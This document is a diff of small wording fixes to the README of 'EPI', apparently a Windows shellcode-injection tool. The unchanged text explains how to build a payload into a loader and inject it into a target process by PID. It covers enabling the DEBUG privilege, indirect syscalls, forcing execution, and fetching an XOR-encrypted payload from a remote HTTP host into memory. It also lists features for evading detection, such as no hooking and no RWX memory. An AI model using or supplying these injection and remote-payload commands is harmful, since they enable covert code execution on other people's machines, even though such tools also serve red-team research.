@@ -12,7 +12,7 @@ The provided shellcode embedded in the Loader spawns a new `cmd.exe /k msg "hell
 
 The advantages of this technique are the following:
 * Both threadless or threaded execution, at will.
-* No hooking (i.e. no RX memory regions are patched).
+* No hooking (i.e. no RX memory regions are patched with JMP or CALL instructions).
 * No generation of private memory regions on well known dll's RX memory pages.
 * No RWX memory permissions required.
 * The targeted process can continue its regular execution.
@@ -38,12 +38,12 @@ After that, run the tool:
 
 ## No Loader - Custom payload
 
-If you just want to directly execute your custom shellcode without using the Loader (which is *highly unrecommended*), just run `builder.py` with the flag `-p` indicating the full path of your payload file. Then, just run `epi.exe`:
+If you just want to directly execute your custom shellcode without using the Loader (which is **highly unrecommended**), just run `builder.py` with the flag `-p` indicating the full path of your payload file. Then, just run `epi.exe`:
 
 	C:\Users\User\Desktop\EPI> python3 builder.py -p c:\path\to\payload.bin
 	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -h 
 
-In case you dont want to embed the payload in the resulting binary, you can encrypt it (simple xor encryption) using the `-d` flag and then download it directly into the injector's process memory using HTTP:
+In case you don't want to embed the payload in the resulting binary, you can encrypt it (simple xor encryption) using the `-d` flag and then download it directly into the injector's process memory using HTTP:
 
 	C:\Users\User\Desktop\EPI> python3 builder.py -p c:\path\to\payload.bin -d
 
@@ -61,7 +61,7 @@ To build the tool, run `builder.py` with the `-l` flag to indicate the use of th
 
 	C:\Users\User\Desktop\EPI> python3 builder.py -l -p c:\path\to\payload.bin [-i]
 
-This execution will embed your payload in the Loader, compile the Loader, convert it into sRDI and embed the final PIC code in EPI. Once the builder ends its execution, the injector is ready to be used:
+This execution will embed your payload in the Loader, compile the Loader, convert it into sRDI and embed the final PIC code in the injector. Once the builder ends its execution, the injector is ready to be used:
 
 	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p <PID> [flags]
 
@@ -79,7 +79,7 @@ The basic usage is by passing to the tool the PID of the target process and wait
 
 	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337
 
-In case that you need to enable the `DEBUG` privilege to perform the injection, you can use the flag `-d`. Also, the use of indirect syscalls in the injector can be enabled using the `-i` flag 
+In case that you need to enable the `DEBUG` privilege to perform the injection, you can use the flag `-d`. Also, the use of indirect syscalls in the injector can be enabled using the `-i` flag.
 
 	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337 -d -i 
 
@@ -91,7 +91,7 @@ Finally, you can also force the execution of the injected shellcode by sending a
 
  	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337 -s
 
-In case that you built the payload so that it is downloaded directly into memory, the `-u` (remote HTTP site serving the payload) and `-k` (decryption key) must be passed to the injector.
+In case that you built the payload so that it is downloaded directly into memory, the `-u` (remote HTTP site serving the payload) and `-k` (decryption key) flags must be passed to the injector.
 	
 	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p <PID> -u http://remoteip/payload.bin -k setarandomkeyeachtime [flags]
 
